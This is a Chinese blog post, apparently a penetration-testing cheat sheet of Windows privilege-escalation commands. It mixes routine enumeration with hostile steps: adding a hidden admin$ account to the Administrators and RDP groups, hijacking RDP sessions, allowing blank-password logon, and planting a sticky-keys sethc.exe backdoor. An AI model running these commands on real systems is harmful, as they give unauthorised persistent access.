@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="提权,">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows提权常用命令">
+<meta property="og:url" content="http://yoursite.com/2018/03/09/windows提权常用命令/index.html">
+<meta property="og:site_name" content="WBGlIl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/07/21/5d3486dd679ba43321.jpg">
+<meta property="og:updated_time" content="2019-07-21T15:38:36.928Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows提权常用命令">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/21/5d3486dd679ba43321.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/09/windows提权常用命令/">
+
+
+
+
+
+  <title>windows提权常用命令 | WBGlIl</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WBGlIl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/09/windows提权常用命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WBGlIl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WBGlIl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows提权常用命令</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-09T20:18:15+08:00">
+                2018-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.loli.net/2019/07/21/5d3486dd679ba43321.jpg" alt></p>
+<a id="more"></a>
+<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看进程</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">查看进程服务</span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">查看调用某个dll的进程</span><br><span class="line">tasklist /m dll</span><br><span class="line"></span><br><span class="line">显示当前进程和进程用户</span><br><span class="line">tasklist /v</span><br></pre></td></tr></table></figure>
+
+<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设定为utf-8</span><br><span class="line">chcp 65001 </span><br><span class="line"></span><br><span class="line">设定为GBK</span><br><span class="line">chcp 936 GBK</span><br></pre></td></tr></table></figure>
+
+<h1 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">查看计算机用户列表</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">查看计算机用户组列表</span><br><span class="line">net localgroup</span><br><span class="line"></span><br><span class="line">添加一个用户</span><br><span class="line">net user admin$ q@123456 /add</span><br><span class="line"></span><br><span class="line">将用户加入管理组</span><br><span class="line">net localgroup administrators admin$ /add</span><br><span class="line"></span><br><span class="line">将用户加入远程桌面组</span><br><span class="line">net localgroup "Remote Desktop Users" admin$ /add</span><br><span class="line"></span><br><span class="line">查用户登陆情况</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">显示会话情况</span><br><span class="line">qwinsta</span><br><span class="line"></span><br><span class="line">会话劫持</span><br><span class="line">tscon id</span><br><span class="line"></span><br><span class="line">查看当前登陆用户信息</span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">写文件</span><br><span class="line">echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 &gt;hex.txt</span><br><span class="line">hex转成bin文件</span><br><span class="line">	certutil -decodehex hex.txt bin.txt</span><br><span class="line">	-encode base64编码</span><br><span class="line">	-decode base64解码</span><br></pre></td></tr></table></figure>
+
+<h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">主机名</span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line">系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">环境变量</span><br><span class="line">set</span><br><span class="line"></span><br><span class="line">查看所以盘符</span><br><span class="line">fsutil fsinfo drives</span><br><span class="line"></span><br><span class="line">显示当前域或工作组中计算机的列表</span><br><span class="line">net view</span><br><span class="line"></span><br><span class="line">查看主机开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">查看共享文件夹</span><br><span class="line">net share</span><br><span class="line"></span><br><span class="line">查询域管理员用户</span><br><span class="line">net group "domain admins" /domain</span><br><span class="line"></span><br><span class="line">查询域用户</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">查询域名称</span><br><span class="line">net view /domain</span><br><span class="line"></span><br><span class="line">查询域内计算机</span><br><span class="line">net view /domain:xxxx</span><br><span class="line"></span><br><span class="line">查询域控制器</span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">修改文件属性</span><br><span class="line">	attrib</span><br><span class="line">	+添加权限</span><br><span class="line">	-清除权限</span><br><span class="line">	R   只读文件属性。</span><br><span class="line">	A   存档文件属性。</span><br><span class="line">	S   系统文件属性。</span><br><span class="line">	H   隐藏文件属性。</span><br><span class="line">	I   无内容索引文件属性。</span><br><span class="line">	X   无清理文件属性。</span><br><span class="line">	V   完整性属性。</span><br><span class="line">	[drive:][path][filename]</span><br><span class="line">	指定 attrib 要处理的文件。</span><br><span class="line">	/S  处理当前文件夹</span><br><span class="line">	及其所有子文件夹中的匹配文件。</span><br><span class="line">	/D  也处理文件夹。</span><br><span class="line">	/L  处理符号链接和</span><br><span class="line">	符号链接目标的属性</span><br><span class="line"></span><br><span class="line">修改文件访问控制</span><br><span class="line">	Cacls</span><br><span class="line">	filename 文件名</span><br><span class="line">	/T 更改当前目录及其所有子目录中</span><br><span class="line">	/L 对照目标处理符号链接本身</span><br><span class="line">	/M 更改装载到目录的卷的 ACL</span><br><span class="line">	/S 显示 DACL 的 SDDL 字符串</span><br><span class="line">	/E 编辑 ACL 而不替换</span><br><span class="line">	/C 在出现拒绝访问错误时继续</span><br><span class="line">	/G user:perm 赋予指定用户访问权限</span><br><span class="line">	perm:R读取 W写入 C更改 F完全控制</span><br><span class="line">	/R user 撤销指定用户的访问权限(仅在与 /E 一起使用时合法)</span><br><span class="line">	/P user:perm  替换指定用户的访问权限</span><br><span class="line">	perm:R读取 W写入 C更改 F完全控制</span><br><span class="line">	/D user 拒绝指定用户的访问</span><br><span class="line"></span><br><span class="line">创建服务</span><br><span class="line">sc create "name" binpath= "path" Type= share Start= disabled(禁用)|demand(手动)|auto (自动)</span><br><span class="line"></span><br><span class="line">修改服务</span><br><span class="line">sc config "name" start= disabled(禁用)|demand(手动)|auto (自动)</span><br><span class="line"></span><br><span class="line">查看3389是否开</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections</span><br><span class="line">0x0为开</span><br><span class="line">0x1为不开</span><br><span class="line"></span><br><span class="line">telnet ip 3389</span><br><span class="line"></span><br><span class="line">查看远程端口</span><br><span class="line">tasklist /svc</span><br><span class="line">找到远程服务pid</span><br><span class="line">netstat -aon</span><br><span class="line">找到对应的pid</span><br><span class="line"></span><br><span class="line">开启3389</span><br><span class="line"></span><br><span class="line">wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br><span class="line">win2012通用；win7前两条即可。权限需要run as administrator。</span><br><span class="line"></span><br><span class="line">win2008</span><br><span class="line">wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">win03 winxp</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">允许空密码远程登陆</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" /v LimitBlankPasswordUse /t reg_dword /d 0 /f</span><br><span class="line"></span><br><span class="line">解决管理员用户连接不了C$等默认共享的问题</span><br><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">查看所以已开启的服务</span><br><span class="line">net start</span><br><span class="line"></span><br><span class="line">启动服务</span><br><span class="line">net start</span><br><span class="line"></span><br><span class="line">停止服务</span><br><span class="line">net stop</span><br><span class="line"></span><br><span class="line">shift后门</span><br><span class="line">copy c:\windows\explorer.exe c:\windows\system32\sethc.exe </span><br><span class="line">copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="wmic命令"><a href="#wmic命令" class="headerlink" title="wmic命令"></a>wmic命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">查看bios信息</span><br><span class="line">wmic bios</span><br><span class="line"></span><br><span class="line">查看补丁信息</span><br><span class="line">wmic qfe</span><br><span class="line"></span><br><span class="line">查看启动项</span><br><span class="line">wmic startup</span><br><span class="line"></span><br><span class="line">查看服务</span><br><span class="line">wmic service</span><br><span class="line"></span><br><span class="line">查看系统</span><br><span class="line">wmic os</span><br><span class="line"></span><br><span class="line">执行程序</span><br><span class="line">wmic path win32_process call create ""</span><br><span class="line"></span><br><span class="line">列出进程</span><br><span class="line">wmic process list brief</span><br><span class="line"></span><br><span class="line">查看工作组/域</span><br><span class="line">wmic computersystem get domain</span><br><span class="line"></span><br><span class="line">重命名</span><br><span class="line">wmic datafile "c:\\hello.txt" call rename c:\\test.txt</span><br><span class="line"></span><br><span class="line">查找e盘下名为test的目录</span><br><span class="line">wmic FSDIR where "drive='E:' and filename='test'" list</span><br><span class="line"></span><br><span class="line">运行test服务</span><br><span class="line">wmic SERVICE where name="test" call startservice</span><br><span class="line"></span><br><span class="line">停止test服务</span><br><span class="line">wmic SERVICE where name="test" call stopservice</span><br><span class="line"></span><br><span class="line">暂停test服务</span><br><span class="line">wmic SERVICE where name="test" call PauseService</span><br><span class="line"></span><br><span class="line">删除服务</span><br><span class="line">wmic SERVICE where name="test" call delete</span><br><span class="line"></span><br><span class="line">结束进程</span><br><span class="line">wmic process where name="test.exe" call terminate</span><br><span class="line"></span><br><span class="line">限制本地用户修改密码</span><br><span class="line">wmic useraccount where name='test' set passwordchangeable=false</span><br><span class="line"></span><br><span class="line">用户账号重命名</span><br><span class="line">wmic useraccount where name='test' rename admin</span><br><span class="line"></span><br><span class="line">锁定用户账号</span><br><span class="line">wmic useraccount where name='test' set disabled=false</span><br><span class="line"></span><br><span class="line">获取已安装的杀软</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">判断目标系统是否为虚拟机</span><br><span class="line">wmic onboarddevice get Desciption,DeviceType,Enabled,Status /format:list</span><br><span class="line"></span><br><span class="line">获取内存芯片信息</span><br><span class="line">wmic memorychip get PartNumber,SerialNumber</span><br><span class="line"></span><br><span class="line">获取系统驱动详情</span><br><span class="line">wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list</span><br><span class="line"></span><br><span class="line">获取正在运行的服务列表</span><br><span class="line">wmic service where (state=”running”) get caption, name, startmode</span><br><span class="line"></span><br><span class="line">枚举没有被双引号包裹的服务</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows\\" |findstr /i /v """</span><br><span class="line"></span><br><span class="line">获取开机启动列表</span><br><span class="line">wmic startup list full</span><br><span class="line">	</span><br><span class="line">跟踪路由查看网络范围</span><br><span class="line">tracert</span><br><span class="line"></span><br><span class="line">端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.5</span><br><span class="line">将本地的80流量转发到192.168.1.5:3389</span><br><span class="line"></span><br><span class="line">删除所有转发规则</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line"></span><br><span class="line">显示全部转发规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">注意远程转发要防火墙允许</span><br><span class="line">netsh advfirewall firewall add rule name="名字" protocol=TCP/UDP dir=in localport=端口 action=allow</span><br><span class="line"></span><br><span class="line">显示防火墙前配置文件</span><br><span class="line">netsh advfirewall firewall show currentprofile</span><br><span class="line"></span><br><span class="line">显示防火墙服务配置</span><br><span class="line">netsh advfirewall firewall show service</span><br><span class="line"></span><br><span class="line">显示防火墙端口配置</span><br><span class="line">netsh advfirewall firewall show portopening</span><br><span class="line"></span><br><span class="line">查看系统体系</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% </span><br><span class="line"></span><br><span class="line">查看计划任务</span><br><span class="line">schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line">查看网络情况</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">本地密码策略</span><br><span class="line">net accounts</span><br><span class="line"></span><br><span class="line">注销用户</span><br><span class="line">logoff id</span><br><span class="line"></span><br><span class="line">锁屏</span><br><span class="line">RunDll32.exe user32.dll,LockWorkStation</span><br><span class="line"></span><br><span class="line">识别,修改文件或目录权限</span><br><span class="line">icacls test</span><br><span class="line">　　简单权限序列:</span><br><span class="line">　　N - 无访问权限</span><br><span class="line">　　F - 完全访问权限</span><br><span class="line">　　M - 修改权限</span><br><span class="line">　　RX - 读取和执行权限</span><br><span class="line">　　R - 只读权限</span><br><span class="line">　　W - 只写权限</span><br><span class="line">　　D - 删除权限</span><br><span class="line">　　在括号中以逗号分隔的特定权限列表:</span><br><span class="line">　　DE - 删除</span><br><span class="line">　　RC - 读取控制</span><br><span class="line">　　WDAC - 写入 DAC</span><br><span class="line">　　WO - 写入所有者</span><br><span class="line">　　S - 同步</span><br><span class="line">　　AS - 访问系统安全性</span><br><span class="line">　　MA - 允许的最大值</span><br><span class="line">　　GR - 一般性读取</span><br><span class="line">　　GW - 一般性写入</span><br><span class="line">　　GE - 一般性执行</span><br><span class="line">　　GA - 全为一般性</span><br><span class="line">　　RD - 读取数据/列出目录</span><br><span class="line">　　WD - 写入数据/添加文件</span><br><span class="line">　　AD - 附加数据/添加子目录</span><br><span class="line">　　REA - 读取扩展属性</span><br><span class="line">　　WEA - 写入扩展属性</span><br><span class="line">　　X - 执行/遍历</span><br><span class="line">　　DC - 删除子项</span><br><span class="line">　　RA - 读取属性</span><br><span class="line">　　WA - 写入属性</span><br><span class="line">　　继承权限可以优先于每种格式，但只应用于目录:</span><br><span class="line">　　(OI) - 对象继承</span><br><span class="line">　　(CI) - 容器继承</span><br><span class="line">　　(IO) - 仅继承</span><br><span class="line">　　(NP) - 不传播继承</span><br><span class="line">　　(I) - 从父容器继承的权限</span><br><span class="line"></span><br><span class="line">读取操作系统版本</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v ProductName</span><br><span class="line"></span><br><span class="line">读取远程连接记录</span><br><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Terminal" "Server" "Client\Servers /s</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/提权/" rel="tag"># 提权</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/09/关于/" rel="next" title="关于我">
+                <i class="fa fa-chevron-left"></i> 关于我
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/10/神器mimikatz/" rel="prev" title="神器mimikatz">
+                神器mimikatz <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
